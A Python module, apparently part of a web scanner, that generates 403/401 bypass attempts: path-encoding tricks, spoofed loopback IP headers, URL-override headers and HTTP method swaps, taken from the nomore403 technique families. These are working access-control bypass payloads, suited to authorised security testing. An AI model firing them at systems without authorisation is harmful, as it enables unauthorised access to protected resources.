"""403/401 bypass fold (the nomore403 idea, built in).

A 403 means "exists but denied" — often a thin ACL that a path/header/method
trick walks around. When a 403/401 is found, this emits a curated set of bypass
variants (the families nomore403/bypass-403 use); the scanner fires them and a
2xx that survives soft-404 verification — and isn't the homepage or the 403 page
itself — is reported as a real bypass, so the report says which 403s actually
hide content vs which are just a wall.

The payload lists below are a *curated* subset of nomore403's: the highest-signal
techniques, deduped, with the no-ops removed — so a WAF-throttled run spends its
budget on attempts that actually flip 403→200, not the long tail. Each variant is
(label, method, request_path, extra_headers).
"""

from __future__ import annotations

# IP-trust headers — an ACL/WAF that allowlists an internal/edge address. The
# Cloudflare/cluster/edge headers come first: targets behind Cloudflare/AWS WAF
# trust these from the edge, so they're the highest-signal in practice.
_IP_HEADERS = (
    "CF-Connecting-IP", "Cluster-Client-IP", "True-Client-IP", "X-Forwarded-For",
    "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP",
    "Client-IP", "X-True-IP", "X-Original-Remote-Addr",
)

# Loopback spellings — a naive allowlist/WAF regex that matches "127.0.0.1" may
# miss these. Kept short; applied only to the most common header (X-Forwarded-For)
# so the header axis doesn't explode.
_IP_ALT_VALUES = ("127.1", "localhost")

# Single trust/override headers (name -> value).
_NAMED_HEADERS = {
    "X-Custom-IP-Authorization": "127.0.0.1",
    "X-Forwarded-Host": "localhost",
    "X-Forwarded-Proto": "http",
    "X-Forwarded-Server": "localhost",
    "X-Host": "localhost",
    "Forwarded": "for=127.0.0.1;host=localhost;proto=http",
}

# Path suffixes appended to the target path. Dot/slash games, encoded separators,
# CR/LF/null, matrix params (`;`/`..;/` — Tomcat/Spring), double-encoding, the
# IIS backslash, and extension spoofs (defeat extension-based ACLs).
_SUFFIXES = (
    "/", "/.", "//", "/./", "%20", "%09", "%00", "%0a", "%0d", "%2f", "%252f",
    "..;/", ";/", "/..;/", ".;/", "..%2f", "%5c", "?", "~", "/*",
    ".json", ".html", ".css", ".php", ".aspx", ".xml",
)

# Prefix/mid forms — operate on the body (path without the leading slash). The
# server normalises these differently before vs after the ACL check.
_PREFIXES = ("/./", "//", "/%2e/", "/%2e%2e//", "/.;/")


def _swapcase(p: str) -> str:
    return "/" + p.lstrip("/").swapcase()


def variants(path: str, case_insensitive: bool = False) -> list[tuple[str, str, str, dict]]:
    """Curated 403-bypass attempts for `path` (deduped, order = likelihood).

    `case_insensitive=True` (a Windows/IIS host, where the ACL ignores case too)
    drops the upper/swapcase path tricks — they'd hit the same resource and the
    same denial, so firing them just wastes the (WAF-throttled) budget.
    """
    p = "/" + path.lstrip("/")
    body = p.lstrip("/")
    out: list[tuple[str, str, str, dict]] = []
    seen: set[tuple] = set()

    def add(label: str, method: str, rpath: str, headers: dict) -> None:
        if not rpath:
            return
        # never emit the plain original request (it's the 403 we're bypassing)
        if method == "GET" and rpath == p and not headers:
            return
        key = (method, rpath, frozenset(headers.items()))
        if key in seen:
            return
        seen.add(key)
        out.append((label, method, rpath, headers))

    # --- path manipulation (GET, no extra headers) ---
    for suf in _SUFFIXES:
        add(f"path {p}{suf}", "GET", p + suf, {})
    for pre in _PREFIXES:
        add(f"path {pre}{body}", "GET", pre + body, {})
    if not case_insensitive:                       # pointless on a case-insensitive ACL
        add(f"path {p.upper()}", "GET", p.upper(), {})
        add(f"path {_swapcase(p)}", "GET", _swapcase(p), {})

    # --- header injection (same path) ---
    for h in _IP_HEADERS:
        add(f"header {h}: 127.0.0.1", "GET", p, {h: "127.0.0.1"})
    for val in _IP_ALT_VALUES:                     # extra loopback spellings on the common header
        add(f"header X-Forwarded-For: {val}", "GET", p, {"X-Forwarded-For": val})
    for h, val in _NAMED_HEADERS.items():
        add(f"header {h}: {val}", "GET", p, {h: val})
    add(f"header Referer: {p}", "GET", p, {"Referer": p})
    # URL-override family: request a path we CAN reach (root), point the header at
    # the blocked target — the backend rewrites to it behind the front-end ACL.
    for h in ("X-Original-URL", "X-Rewrite-URL", "X-HTTP-DestinationURL", "Request-URI"):
        add(f"header {h}", "GET", "/", {h: p})

    # --- method swap (only verbs that can return the *content*; HEAD/OPTIONS
    # return no body and TRACE just echoes, so they'd be false bypasses). Verb
    # *casing* tricks are intentionally omitted: httpx normalises the method to
    # upper-case on the wire, so a lower-case verb would just re-send the GET. ---
    for meth in ("POST", "PATCH"):
        add(f"method {meth}", meth, p, {})

    return out
